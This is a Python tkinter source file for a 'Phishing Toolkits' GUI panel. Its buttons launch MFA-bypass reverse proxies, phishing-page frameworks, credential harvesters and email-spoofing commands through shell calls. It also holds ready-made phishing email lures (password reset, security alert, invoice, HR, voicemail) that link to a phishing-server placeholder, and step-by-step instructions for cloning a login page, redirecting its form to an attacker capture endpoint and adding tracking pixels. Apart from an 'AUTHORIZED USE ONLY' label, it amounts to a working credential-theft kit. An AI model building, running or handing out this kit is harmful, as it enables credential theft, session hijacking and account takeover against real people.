import tkinter as tk
from tkinter import messagebox
import subprocess, threading, os, shutil

class PhishingToolkit:
    def __init__(self, parent, db, logger):
        self.parent = parent; self.db = db; self.logger = logger
        self.frame = tk.Frame(parent, bg='#1a1a2e')

    def build(self):
        self.frame.pack(fill='both', expand=True)
        
        header = tk.Frame(self.frame, bg='#1a1a2e')
        header.pack(fill='x', padx=10, pady=5)
        tk.Label(header, text="Phishing Toolkits", font=('Courier',16,'bold'), fg='#ff0000', bg='#1a1a2e').pack(side='left')
        tk.Label(header, text="AUTHORIZED USE ONLY", font=('Courier',9,'bold'), fg='#ff4444', bg='#1a1a2e').pack(side='right')
        
        canvas = tk.Canvas(self.frame, bg='#1a1a2e', highlightthickness=0)
        vs = tk.Scrollbar(self.frame, orient='vertical', command=canvas.yview)
        hs = tk.Scrollbar(self.frame, orient='horizontal', command=canvas.xview)
        inner = tk.Frame(canvas, bg='#1a1a2e')
        inner.bind('<Configure>', lambda e: canvas.configure(scrollregion=canvas.bbox('all')))
        canvas.create_window((0,0), window=inner, anchor='nw')
        canvas.configure(yscrollcommand=vs.set, xscrollcommand=hs.set)
        canvas.pack(side='left', fill='both', expand=True)
        vs.pack(side='right', fill='y'); hs.pack(side='bottom', fill='x')
        canvas.bind('<Configure>', lambda e: canvas.itemconfig(1, width=e.width))
        
        # === MFA BYPASS / REVERSE PROXY ===
        self._section(inner, "MFA Bypass / Session Hijacking (Advanced)", [
            ("EvilGinx2", "MFA token capture via reverse proxy", "evilginx2 -p phishlet -t target.com", "#ff0000"),
            ("Modlishka", "Automatic reverse proxy with cert cloning", "modlishka -config config.json", "#ff0000"),
            ("Muraena", "Necrobrowser-based real-time session hijacking", "muraena -c config.toml", "#ff0000"),
        ])
        
        # === ENTERPRISE PHISHING ===
        self._section(inner, "Enterprise Campaign Managers", [
            ("GoPhish", "Full campaign management with tracking", "gophish", "#ffaa00"),
            ("King-Phisher", "Enterprise phishing with templates", "king-phisher --server", "#ffaa00"),
        ])
        
        # === MULTI-PAGE PHISHING ===
        self._section(inner, "Multi-Page Phishing Frameworks", [
            ("ZPhisher", "30+ phishing pages, ngrok/cloudflare", "zphisher", "#ff4444"),
            ("BlackEye", "Advanced phishing with multiple tunnels", "blackeye", "#ff4444"),
            ("SocialFish", "Mobile-friendly automated phishing", "socialfish", "#ff4444"),
            ("HiddenEye", "Multi-page with ngrok support", "hiddeneye", "#ff4444"),
            ("ShellPhish", "Shell-based phishing pages", "shellphish", "#ff4444"),
            ("AdvPhishing", "Advanced multi-page framework", "advphishing", "#ff4444"),
            ("MrPhish", "Multi-tunnel phishing framework", "mrphish", "#ff4444"),
        ])
        
        # === CREDENTIAL HARVESTING ===
        self._section(inner, "Credential Harvesters", [
            ("SEToolkit", "Social Engineering Toolkit", "setoolkit", "#ff0000"),
            ("CredPhisher", "Automated credential harvesting", "credphisher", "#ff0000"),
            ("PhishIm", "Office365/Gmail/Outlook phishing", "phishim -t office365", "#ff0000"),
        ])
        
        # === EMAIL SPOOFING ===
        self._section(inner, "Email Spoofing Tools", [
            ("SWAKS", "Swiss Army Knife SMTP", "swaks --to target@test.com --from spoof@test.com", "#00ccff"),
            ("SneakEmail", "Email spoofing with attachments", "sneakemail -f spoof@test.com -t target@test.com", "#00ccff"),
            ("SendEmail", "SMTP sender with HTML support", "sendemail -f spoof@test.com -t target@test.com", "#00ccff"),
        ])
        
        # === TUNNEL / EXPOSE ===
        self._section(inner, "Tunneling & Exposure", [
            ("Ngrok", "Expose local server", "ngrok http 8080", "#3fb950"),
            ("Cloudflared", "Cloudflare tunnel", "cloudflared tunnel --url http://localhost:8080", "#f6821f"),
            ("LocalXpose", "Expose local ports", "loclx tunnel tcp --port 8080", "#00ccff"),
            ("Serveo", "SSH-based tunneling", "ssh -R 80:localhost:8080 serveo.net", "#888888"),
        ])
        
        # === EMAIL TEMPLATES ===
        self._section(inner, "Email Template Generators", [
            ("Password Reset", "Generate password reset email", lambda: self._template("password_reset"), "#ffaa00"),
            ("Security Alert", "Generate security alert email", lambda: self._template("security_alert"), "#ffaa00"),
            ("Invoice Due", "Generate invoice email", lambda: self._template("invoice"), "#ffaa00"),
            ("HR Update", "Generate HR notification", lambda: self._template("hr"), "#ffaa00"),
            ("Document Share", "Generate document sharing email", lambda: self._template("doc_share"), "#ffaa00"),
            ("Voicemail", "Generate voicemail notification", lambda: self._template("voicemail"), "#ffaa00"),
        ])
        
        # === LANDING PAGE CLONER ===
        self._section(inner, "Landing Page Tools", [
            ("Clone Website", "wget mirror target login page", lambda: self._clone_page(), "#bc8cff"),
            ("Modify Form", "Edit form action to capture creds", lambda: self._modify_form(), "#bc8cff"),
            ("Add Tracking", "Add email open tracker pixel", lambda: self._add_tracker(), "#bc8cff"),
            ("SSL Cert Gen", "Generate self-signed SSL cert", lambda: self._ssl_gen(), "#bc8cff"),
        ])
        
        tk.Label(inner, text="", bg='#1a1a2e').pack()
    
    def _section(self, parent, title, items):
        sf = tk.LabelFrame(parent, text=f" {title} ", font=('Courier',10,'bold'), fg='#ffaa00', bg='#16213e', padx=8, pady=5)
        sf.pack(fill='x', padx=10, pady=3)
        for name, desc, cmd, color in items:
            card = tk.Frame(sf, bg='#16213e', padx=8, pady=5); card.pack(fill='x', pady=1)
            h = tk.Frame(card, bg='#16213e'); h.pack(fill='x')
            if callable(cmd):
                tk.Button(h, text=name, font=('Courier',9,'bold'), fg='#000', bg=color, relief='raised', padx=10, pady=4, command=cmd).pack(side='left')
            else:
                tk.Button(h, text=name, font=('Courier',9,'bold'), fg='#000', bg=color, relief='raised', padx=10, pady=4,
                        command=lambda c=cmd: self._run(c)).pack(side='left')
            tk.Label(h, text=desc[:55], font=('Courier',8), fg='#888', bg='#16213e').pack(side='left', padx=8)
    
    def _run(self, cmd):
        d = tk.Toplevel(self.frame, bg='#1a1a2e'); d.title("Output"); d.geometry("650x450")
        tk.Label(d, text=cmd[:100], font=('Courier',10), fg='#00ff88', bg='#1a1a2e').pack(pady=5)
        t = tk.Text(d, font=('Courier',9), bg='#0a0a0a', fg='#00ff88', relief='flat')
        t.pack(fill='both', expand=True, padx=5, pady=5)
        def do():
            try:
                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                out = p.stdout.read()[:8000]
                d.after(0, lambda: t.insert('end', out))
            except Exception as e: d.after(0, lambda: t.insert('end', str(e)))
        threading.Thread(target=do, daemon=True).start()
        tk.Button(d, text="Copy CMD", font=('Courier',10), fg='#000', bg='#00ccff', relief='flat', padx=10, pady=5,
                command=lambda: [d.clipboard_clear(), d.clipboard_append(cmd)]).pack(side='left', padx=10, pady=5)
        tk.Button(d, text="Close", font=('Courier',10), fg='#fff', bg='#666', relief='flat', padx=10, pady=5, command=d.destroy).pack(side='right', padx=10, pady=5)
    
    def _template(self, ttype):
        templates = {
            "password_reset": "Subject: Password Reset Required\n\nDear user,\n\nYour password expires in 24 hours. Please reset immediately:\nhttp://YOUR-PHISHING-SERVER.com/reset\n\nIT Department",
            "security_alert": "Subject: Security Alert - Unusual Login\n\nWe detected an unusual login attempt. Verify your account:\nhttp://YOUR-PHISHING-SERVER.com/verify\n\nSecurity Team",
            "invoice": "Subject: Invoice #INV-2024-XXXX Due\n\nYour invoice is past due. View and pay:\nhttp://YOUR-PHISHING-SERVER.com/invoice\n\nAccounts Department",
            "hr": "Subject: HR Update - Benefits Enrollment\n\nPlease review and update your benefits:\nhttp://YOUR-PHISHING-SERVER.com/hr\n\nHuman Resources",
            "doc_share": "Subject: Document Shared With You\n\nA document has been shared. View here:\nhttp://YOUR-PHISHING-SERVER.com/doc\n\nCloud Storage",
            "voicemail": "Subject: New Voicemail Message\n\nYou have a new voicemail. Listen:\nhttp://YOUR-PHISHING-SERVER.com/voicemail\n\nPhone System",
        }
        text = templates.get(ttype, "Template not found")
        d = tk.Toplevel(self.frame, bg='#1a1a2e'); d.title("Email Template"); d.geometry("500x350")
        tk.Label(d, text="Email Template", font=('Courier',12,'bold'), fg='#ffaa00', bg='#1a1a2e').pack(pady=10)
        t = tk.Text(d, font=('Courier',9), bg='#0a0a0a', fg='#00ff88', relief='flat')
        t.pack(fill='both', expand=True, padx=10, pady=10); t.insert('1.0', text)
        tk.Button(d, text="Copy", font=('Courier',10), fg='#000', bg='#00ccff', relief='raised', padx=15, pady=5,
                command=lambda: [d.clipboard_clear(), d.clipboard_append(text)]).pack(side='left', padx=10, pady=5)
        tk.Button(d, text="Close", font=('Courier',10), fg='#fff', bg='#666', relief='raised', padx=15, pady=5, command=d.destroy).pack(side='right', padx=10, pady=5)
    
    def _clone_page(self):
        self._show("Clone Login Page", "Run in terminal:\n\nwget -mk -p https://target.com/login\ncd target.com\npython3 -m http.server 8080\n\nThen edit login.html - change form action to your server")
    def _modify_form(self):
        self._show("Modify Form", "Edit login.html:\n\nFind: <form action='...'\nReplace: <form action='http://YOUR-IP:8080/capture'\nAdd: <input type='hidden' name='redirect' value='https://real-site.com'>")
    def _add_tracker(self):
        self._show("Add Tracker", "Add to email HTML:\n\n<img src='http://YOUR-SERVER/track.gif?id=UNIQUE_ID' width='1' height='1'>\n\nEach email gets unique ID to track opens.")
    def _ssl_gen(self):
        self._show("SSL Certificate", "Generate self-signed cert:\n\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\nUse with Python server:\nimport ssl\nhttpd.socket = ssl.wrap_socket(httpd.socket, keyfile='key.pem', certfile='cert.pem')")
    def _show(self, title, text):
        d = tk.Toplevel(self.frame, bg='#1a1a2e'); d.title(title); d.geometry("550x350")
        tk.Label(d, text=title, font=('Courier',12,'bold'), fg='#00ff88', bg='#1a1a2e').pack(pady=10)
        t = tk.Text(d, font=('Courier',9), bg='#0a0a0a', fg='#00ff88', relief='flat')
        t.pack(fill='both', expand=True, padx=10, pady=10); t.insert('1.0', text)
        tk.Button(d, text="Copy", font=('Courier',10), fg='#000', bg='#00ccff', relief='raised', padx=15, pady=5,
                command=lambda: [d.clipboard_clear(), d.clipboard_append(text)]).pack(side='left', padx=10, pady=5)
        tk.Button(d, text="Close", font=('Courier',10), fg='#fff', bg='#666', relief='raised', padx=15, pady=5, command=d.destroy).pack(side='right', padx=10, pady=5)
